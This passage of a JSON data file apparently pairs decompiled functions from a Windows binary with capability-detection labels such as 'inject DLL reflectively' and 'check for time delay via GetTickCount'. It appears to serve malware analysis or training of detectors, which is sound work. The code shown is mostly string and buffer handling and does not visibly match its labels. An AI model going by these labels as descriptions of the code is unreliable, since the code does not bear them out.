}\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iStack80, 0);\n    *(iVar3 + iStack80) = 0;\n    *(arg3 + 0x38) = iVar3;\n    *(arg3 + 0x40) = iStack80;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    return;\n}\n",
        "token_count": 604
    },
    "140087b8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140087b80(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uchar uVar6;\n    ushort uVar7;\n    uint uVar8;\n    int64_t iVar9;\n    ulong arg1;\n    int64_t iVar10;\n    int64_t *piVar11;\n    uchar uStack185;\n    int64_t iStack184;\n    int64_t iStack168;\n    int64_t *piStack160;\n    uchar *puStack152;\n    int64_t iStack144;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [16];\n    \n    puStack152 = &stack0xffffffffffffffa8;\n    uStack128 = 0x140087ba2;\n    uVar7 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar7;\n    uStack128 = 0x140087baf;\n    uVar7 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 200) = 1;\n    *(arg3 + 0x4a) = uVar7;\n    iVar5 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    uStack128 = 0x140087bde;\n    (**(iVar5 + 0x20))(puStack152, arg2);\n    iVar5 = iStack80;\n    uStack128 = 0x140087bed;\n    iStack144 = fcn.1400bc6e0(iStack80 + 1);\n    uStack128 = 0x140087c01;\n    iVar9 = iVar5;\n    fcn.14002f850(puStack152, iStack144, iVar5, 0);\n    *(iStack144 + iVar5) = 0;\n    *(arg3 + 0x18) = iVar5;\n    puStack136 = &stack0xffffffffffffffb8;\n    *(arg3 + 0x10) = iStack144;\n    if (puStack88 != puStack136) {\n        uStack128 = 0x140087c23;\n        fcn.1400bc6c0();\n    }\n    uStack128 = 0x140087c2f;\n    piVar11 = arg2;\n    (**(*arg2 + 0x28))(puStack152);\n    iVar5 = iStack80;\n    uVar1 = iStack80 + 1;\n    if (0x3ffffffffffffffc < uVar1) {\n        uStack128 = 0x140087d34;\n        fcn.1400bd850();\n        iStack168 = arg3;\n        piStack160 = arg2;\n        uStack128 = uVar1;\n        uVar6 = (**(*piVar11 + 0x10))(piVar11);\n        *(iVar9 + 0x21) = uVar6;\n        uVar6 = (**(*piVar11 + 0x18))(piVar11);\n        *(iVar9 + 0x22) = uVar6;\n        uVar8 = (**(*piVar11 + 0x40))(piVar11);\n        *(iVar9 + 0x6f) = 1;\n        *(iVar9 + 0x58) = uVar8;\n        iVar5 = *piVar11;\n        *(iVar9 + 0x10) = 0;\n        *(iVar9 + 0x28) = 0;\n        *(iVar9 + 0x38) = 0;\n        *(iVar9 + 0x48) = 0;\n        (**(iVar5 + 0x20))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x18) = iVar5;\n        piVar2 = *0x14010fc90;\n        *(iVar9 + 0x10) = iVar10;\n        if (*piVar2 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack184 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        (**(*piVar11 + 0x28))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        iVar4 = *piVar2;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x28) = iVar10;\n        *(iVar9 + 0x30) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack184 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        (**(*piVar11 + 0x30))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        iVar4 = *piVar2;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x38) = iVar10;\n        *(iVar9 + 0x40) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack184 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        (**(*piVar11 + 0x38))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        iVar4 = *piVar2;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x48) = iVar10;\n        *(iVar9 + 0x50) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = iStack184 + -8;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        uVar8 = (**(*piVar11 + 0x48))(piVar11);\n        *(iVar9 + 0x5c) = uVar8;\n        uVar8 = (**(*piVar11 + 0x50))(piVar11);\n        *(iVar9 + 0x60) = uVar8;\n        return;\n    }\n    uStack128 = 0x140087c56;\n    iVar9 = fcn.1400bc6e0(uVar1 * 2);\n    uStack128 = 0x140087c6a;\n    fcn.1400305e0(puStack152, iVar9, iVar5, 0);\n    *(arg3 + 0x28) = iVar9;\n    *(iVar9 + -2 + uVar1 * 2) = 0;\n    *(arg3 + 0x30) = iVar5;\n    if (puStack88 != puStack136) {\n        uStack128 = 0x140087c89;\n        fcn.1400bc6c0();\n    }\n    uStack128 = 0x140087c95;\n    (**(*arg2 + 0x30))(puStack152, arg2);\n    if (iStack80 + 1U < 0x3ffffffffffffffd) {\n        iVar5 = (iStack80 + 1U) * 2;\n        uStack128 = 0x140087cb8;\n        iVar9 = fcn.1400bc6e0(iVar5);\n        uStack128 = 0x140087ccc;\n        fcn.1400305e0(puStack152, iVar9, iStack80, 0);\n        *(arg3 + 0x38) = iVar9;\n        *(iVar9 + -2 + iVar5) = 0;\n        *(arg3 + 0x40) = iStack80;\n        if (puStack88 != puStack136) {\n            uStack128 = 0x140087cea;\n            fcn.1400bc6c0();\n        }\n        return;\n    }\n    uStack128 = 0x140087d2d;\n    arg1 = fcn.1400bd850();\n    do {\n        if (puStack88 != puStack136) {\n            uStack128 = 0x140087d11;\n            fcn.1400bc6c0();\n        }\n        uStack128 = 0x140087d19;\n        arg1 = fcn.140014f30(arg1);\n    } while( true );\n}\n",
        "token_count": 2433
    },
    "14008802": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140088020(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [24];\n    \n    uVar1 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar1;\n    uVar1 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar1;\n    uVar2 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar2;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    *(arg3 + 0x10) = iVar3;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar3;\n    *(arg3 + 0x30) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar3;\n    *(arg3 + 0x40) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x38))(&puStack88, arg2);\n    iVar4 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar4, iStack80, 0);\n    *(iVar4 + iStack80) = 0;\n    *(arg3 + 0x48) = iVar4;\n    *(arg3 + 0x50) = iStack80;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    uVar2 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar2;\n    uVar2 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar2;\n    return;\n}\n",
        "token_count": 859
    },
    "1400884f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.1400884f0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [24];\n    \n    uVar1 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar1;\n    uVar1 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar1;\n    uVar2 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar2;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    *(arg3 + 0x10) = iVar3;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar3;\n    *(arg3 + 0x30) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar3;\n    *(arg3 + 0x40) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x38))(&puStack88, arg2);\n    iVar4 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar4, iStack80, 0);\n    *(iVar4 + iStack80) = 0;\n    *(arg3 + 0x48) = iVar4;\n    *(arg3 + 0x50) = iStack80;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    uVar2 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar2;\n    uVar2 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar2;\n    return;\n}\n",
        "token_count": 861
    },
    "140088a4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140088a40(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ushort uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ulong *arg1;\n    int64_t *piVar10;\n    uchar *puStack312;\n    int64_t iStack304;\n    uchar auStack296 [24];\n    int64_t *piStack272;\n    uchar *puStack264;\n    int64_t iStack256;\n    uint64_t uStack248;\n    int32_t *piStack240;\n    int64_t iStack232;\n    uchar uStack185;\n    int64_t iStack184;\n    int64_t iStack176;\n    int64_t *piStack168;\n    uchar *puStack160;\n    int64_t iStack152;\n    uint64_t uStack144;\n    uchar *puStack136;\n    int64_t iStack128;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [16];\n    \n    puStack160 = &stack0xffffffffffffffa8;\n    iStack128 = 0x140088a62;\n    uVar4 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar4;\n    iStack128 = 0x140088a6f;\n    uVar4 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar4;\n    iStack128 = 0x140088a7c;\n    uVar5 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar5;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    iStack128 = 0x140088aaf;\n    (**(iVar3 + 0x20))(puStack160, arg2);\n    iVar3 = iStack80;\n    iStack128 = 0x140088abe;\n    iStack152 = fcn.1400bc6e0(iStack80 + 1);\n    iStack128 = 0x140088ad2;\n    iVar6 = iVar3;\n    fcn.14002f850(puStack160, iStack152, iVar3, 0);\n    puStack136 = &stack0xffffffffffffffb8;\n    *(iStack152 + iVar3) = 0;\n    *(arg3 + 0x10) = iStack152;\n    *(arg3 + 0x18) = iVar3;\n    if (puStack88 != puStack136) {\n        iStack128 = 0x140088af4;\n        fcn.1400bc6c0();\n    }\n    iStack128 = 0x140088b00;\n    piStack272 = arg2;\n    (**(*arg2 + 0x28))(puStack160);\n    iVar3 = iStack80;\n    uStack144 = iStack80 + 1;\n    if (uStack144 < 0x3ffffffffffffffd) {\n        iStack128 = 0x140088b27;\n        iVar6 = fcn.1400bc6e0(uStack144 * 2);\n        iStack128 = 0x140088b3b;\n        fcn.1400305e0(puStack160, iVar6, iVar3, 0);\n        *(arg3 + 0x28) = iVar6;\n        *(iVar6 + -2 + uStack144 * 2) = 0;\n        *(arg3 + 0x30) = iVar3;\n        if (puStack88 != puStack136) {\n            iStack128 = 0x140088b5a;\n            fcn.1400bc6c0();\n        }\n        iStack128 = 0x140088b66;\n        (**(*arg2 + 0x30))(puStack160, arg2);\n        iVar3 = iStack80;\n        if (iStack80 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iStack80 + 1U) * 2;\n            iStack128 = 0x140088b8d;\n            iVar7 = fcn.1400bc6e0(iVar6);\n            iStack128 = 0x140088ba1;\n            fcn.1400305e0(puStack160, iVar7, iVar3, 0);\n            *(arg3 + 0x38) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(arg3 + 0x40) = iVar3;\n            if (puStack88 != puStack136) {\n                iStack128 = 0x140088bc0;\n                fcn.1400bc6c0();\n            }\n            iStack128 = 0x140088bcc;\n            (**(*arg2 + 0x38))(puStack160, arg2);\n            if (iStack80 + 1U < 0x3ffffffffffffffd) {\n                iVar3 = (iStack80 + 1U) * 2;\n                iStack128 = 0x140088bf3;\n                iVar6 = fcn.1400bc6e0(iVar3);\n                iStack128 = 0x140088c07;\n                fcn.1400305e0(puStack160, iVar6, iStack80, 0);\n                *(arg3 + 0x48) = iVar6;\n                *(iVar6 + -2 + iVar3) = 0;\n                *(arg3 + 0x50) = iStack80;\n                if (puStack88 != puStack136) {\n                    iStack128 = 0x140088c26;\n                    fcn.1400bc6c0();\n                }\n                iStack128 = 0x140088c2f;\n                uVar5 = (**(*arg2 + 0x48))(arg2);\n                *(arg3 + 0x5c) = uVar5;\n                iStack128 = 0x140088c3b;\n                uVar5 = (**(*arg2 + 0x50))(arg2);\n                *(arg3 + 0x60) = uVar5;\n                return;\n            }\n            iStack128 = 0x140088c80;\n            uVar8 = fcn.1400bd850();\n        }\n        else {\n            iStack128 = 0x140088c87;\n            uVar8 = fcn.1400bd850();\n        }\n        do {\n            if (puStack88 != puStack136) {\n                iStack128 = 0x140088c64;\n                fcn.1400bc6c0();\n            }\n            iStack128 = 0x140088c6c;\n            uVar8 = fcn.140014f30(uVar8);\n        } while( true );\n    }\n    iStack128 = 0x140088c8e;\n    fcn.1400bd850();\n    iStack128 = iStack80;\n    puStack264 = &stack0xffffffffffffff48;\n    iStack232 = 0x140088cb2;\n    iStack176 = arg3;\n    piStack168 = arg2;\n    uVar4 = (**(*piStack272 + 0x10))(piStack272);\n    *(iVar6 + 0x22) = uVar4;\n    iStack232 = 0x140088cbf;\n    uVar4 = (**(*piStack272 + 0x18))(piStack272);\n    *(iVar6 + 0x24) = uVar4;\n    iStack232 = 0x140088ccc;\n    uVar5 = (**(*piStack272 + 0x40))(piStack272);\n    *(iVar6 + 0x7a) = 1;\n    *(iVar6 + 0x58) = uVar5;\n    iVar3 = *piStack272;\n    *(iVar6 + 0x10) = 0;\n    *(iVar6 + 0x28) = 0;\n    *(iVar6 + 0x38) = 0;\n    *(iVar6 + 0x48) = 0;\n    iStack232 = 0x140088cff;\n    (**(iVar3 + 0x20))(puStack264, piStack272);\n    iVar3 = *(iStack184 + -0x18);\n    iStack232 = 0x140088d12;\n    iStack256 = fcn.1400bc6e0(iVar3 + 1);\n    iStack232 = 0x140088d26;\n    iVar7 = iVar3;\n    fcn.140024ea0(puStack264, iStack256, iVar3, 0);\n    piStack240 = *0x14010fc90;\n    *(iStack256 + iVar3) = 0;\n    *(iVar6 + 0x10) = iStack256;\n    iVar2 = *piStack240;\n    *(iVar6 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack184 + -8);\n        *(iStack184 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack184 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack232 = 0x140088f20;\n        fcn.14007bf10(iStack184 + -0x18, &stack0xffffffffffffff47);\n    }\n    iStack232 = 0x140088d6a;\n    piVar10 = piStack272;\n    (**(*piStack272 + 0x28))(puStack264);\n    iVar3 = *(iStack184 + -0x18);\n    uStack248 = iVar3 + 1;\n    if (0x3ffffffffffffffc < uStack248) {\n        iStack232 = 0x140088fec;\n        fcn.1400bd850();\n        iStack232 = iVar3;\n        uVar4 = (**(*piVar10 + 0x10))(piVar10);\n        *(iVar7 + 0x22) = uVar4;\n        uVar4 = (**(*piVar10 + 0x18))(piVar10);\n        *(iVar7 + 0x24) = uVar4;\n        uVar5 = (**(*piVar10 + 0x40))(piVar10);\n        *(iVar7 + 0x7a) = 1;\n        *(iVar7 + 0x58) = uVar5;\n        iVar3 = *piVar10;\n        *(iVar7 + 0x10) = 0;\n        *(iVar7 + 0x28) = 0;\n        *(iVar7 + 0x38) = 0;\n        *(iVar7 + 0x48) = 0;\n        (**(iVar3 + 0x20))(&stack0xfffffffffffffec8, piVar10);\n        iVar3 = iStack304;\n        iVar6 = fcn.1400bc6e0(iStack304 + 1);\n        fcn.14002f850(&stack0xfffffffffffffec8, iVar6, iVar3, 0);\n        *(iVar6 + iVar3) = 0;\n        *(iVar7 + 0x10) = iVar6;\n        *(iVar7 + 0x18) = iVar3;\n        if (puStack312 != &stack0xfffffffffffffed8) {\n            fcn.1400bc6c0();\n        }\n        arg1 = &stack0xfffffffffffffec8;\n        (**(*piVar10 + 0x28))(&stack0xfffffffffffffec8, piVar10);\n        iVar3 = iStack304;\n        if (iStack304 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iStack304 + 1U) * 2;\n            iVar9 = fcn.1400bc6e0(iVar6);\n            fcn.1400305e0(&stack0xfffffffffffffec8, iVar9, iVar3, 0);\n            *(iVar7 + 0x28) = iVar9;\n            *(iVar9 + -2 + iVar6) = 0;\n            *(iVar7 + 0x30) = iVar3;\n            if (puStack312 != &stack0xfffffffffffffed8) {\n                fcn.1400bc6c0();\n            }\n            (**(*piVar10 + 0x30))(&stack0xfffffffffffffec8, piVar10);\n            iVar3 = iStack304;\n            if (iStack304 + 1U < 0x3ffffffffffffffd) {\n                iVar6 = (iStack304 + 1U) * 2;\n                iVar9 = fcn.1400bc6e0(iVar6);\n                fcn.1400305e0(&stack0xfffffffffffffec8, iVar9, iVar3, 0);\n                *(iVar7 + 0x38) = iVar9;\n                *(iVar9 + -2 + iVar6) = 0;\n                *(iVar7 + 0x40) = iVar3;\n                if (puStack312 != &stack0xfffffffffffffed8) {\n                    fcn.1400bc6c0();\n                }\n                (**(*piVar10 + 0x38))(&stack0xfffffffffffffec8, piVar10);\n                if (iStack304 + 1U < 0x3ffffffffffffffd) {\n                    iVar3 = (iStack304 + 1U) * 2;\n                    iVar6 = fcn.1400bc6e0(iVar3);\n                    fcn.1400305e0(&stack0xfffffffffffffec8, iVar6, iStack304, 0);\n                    *(iVar7 + 0x48) = iVar6;\n                    *(iVar6 + -2 + iVar3) = 0;\n                    *(iVar7 + 0x50) = iStack304;\n                    if (puStack312 != &stack0xfffffffffffffed8) {\n                        fcn.1400bc6c0();\n                    }\n                    uVar5 = (**(*piVar10 + 0x48))(piVar10);\n                    *(iVar7 + 0x5c) = uVar5;\n                    uVar5 = (**(*piVar10 + 0x50))(piVar10);\n                    *(iVar7 + 0x60) = uVar5;\n                    return;\n                }\n                uVar8 = fcn.1400bd850();\n            }\n            else {\n                uVar8 = fcn.1400bd850();\n            }\n            do {\n                if (puStack312 != &stack0xfffffffffffffed8) {\n                    fcn.1400bc6c0();\n                }\n                uVar8 = fcn.140014f30(uVar8);\n            } while( true );\n        }\n        fcn.1400bd850();\n        *arg1 = 0x140117c30;\n        fcn.1400b7940(arg1 + 4);\n        *arg1 = 0x140117680;\n        fcn.1400838b0(arg1);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(arg1);\n        return;\n    }\n    iStack232 = 0x140088d95;\n    iVar7 = fcn.1400bc6e0(uStack248 * 2);\n    iStack232 = 0x140088da9;\n    fcn.140023e10(puStack264, iVar7, iVar3, 0);\n    iVar2 = *piStack240;\n    *(iVar6 + 0x28) = iVar7;\n    *(iVar7 + -2 + uStack248 * 2) = 0;\n    *(iVar6 + 0x30) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack184 + -8);\n        *(iStack184 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack184 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack232 = 0x140088f98;\n        fcn.140072a10(iStack184 + -0x18, &stack0xffffffffffffff47);\n    }\n    iStack232 = 0x140088de9;\n    (**(*piStack272 + 0x30))(puStack264, piStack272);\n    iVar3 = *(iStack184 + -0x18);\n    if (iVar3 + 1U < 0x3ffffffffffffffd) {\n        iVar7 = (iVar3 + 1U) * 2;\n        iStack232 = 0x140088e14;\n        iVar9 = fcn.1400bc6e0(iVar7);\n        iStack232 = 0x140088e28;\n        fcn.140023e10(puStack264, iVar9, iVar3, 0);\n        iVar2 = *piStack240;\n        *(iVar6 + 0x38) = iVar9;\n        *(iVar9 + -2 + iVar7) = 0;\n        *(iVar6 + 0x40) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack184 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack232 = 0x140088f70;\n            fcn.140072a10(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        iStack232 = 0x140088e67;\n        (**(*piStack272 + 0x38))(puStack264, piStack272);\n        iVar3 = *(iStack184 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar7 = (iVar3 + 1U) * 2;\n            iStack232 = 0x140088e92;\n            iVar9 = fcn.1400bc6e0(iVar7);\n            iStack232 = 0x140088ea6;\n            fcn.140023e10(puStack264, iVar9, iVar3, 0);\n            iVar2 = *piStack240;\n            *(iVar6 + 0x48) = iVar9;\n            *(iVar9 + -2 + iVar7) = 0;\n            *(iVar6 + 0x50) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack184 + -8);\n                *(iStack184 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack184 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack232 = 0x140088f44;\n                fcn.140072a10(iStack184 + -0x18, &stack0xffffffffffffff47);\n            }\n            iStack232 = 0x140088ed9;\n            uVar5 = (**(*piStack272 + 0x48))(piStack272);\n            *(iVar6 + 0x5c) = uVar5;\n            iStack232 = 0x140088ee5;\n            uVar5 = (**(*piStack272 + 0x50))(piStack272);\n            *(iVar6 + 0x60) = uVar5;\n            return;\n        }\n        iStack232 = 0x140088fe5;\n        uVar8 = fcn.1400bd850();\n    }\n    else {\n        iStack232 = 0x140088fa2;\n        uVar8 = fcn.1400bd850();\n    }\n    do {\n        iStack232 = 0x140088fb8;\n        fcn.140072a20(iStack184 + -0x18);\n        iStack232 = 0x140088fc0;\n        uVar8 = fcn.140014f30(uVar8);\n    } while( true );\n}\n",
        "token_count": 4643
    },
    "140088ff": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140088ff0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    ushort uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong arg1;\n    uchar **arg1_00;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [16];\n    \n    uVar2 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar2;\n    uVar2 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar2;\n    uVar3 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar3;\n    iVar1 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar1 + 0x20))(&puStack88, arg2);\n    iVar1 = iStack80;\n    iVar4 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar4, iVar1, 0);\n    *(iVar4 + iVar1) = 0;\n    *(arg3 + 0x10) = iVar4;\n    *(arg3 + 0x18) = iVar1;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    arg1_00 = &puStack88;\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar1 = iStack80;\n    if (0x3ffffffffffffffc < iStack80 + 1U) {\n        fcn.1400bd850();\n        *arg1_00 = 0x140117c30;\n        fcn.1400b7940(arg1_00 + 4);\n        *arg1_00 = 0x140117680;\n        fcn.1400838b0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(arg1_00);\n        return;\n    }\n    iVar4 = (iStack80 + 1U) * 2;\n    iVar5 = fcn.1400bc6e0(iVar4);\n    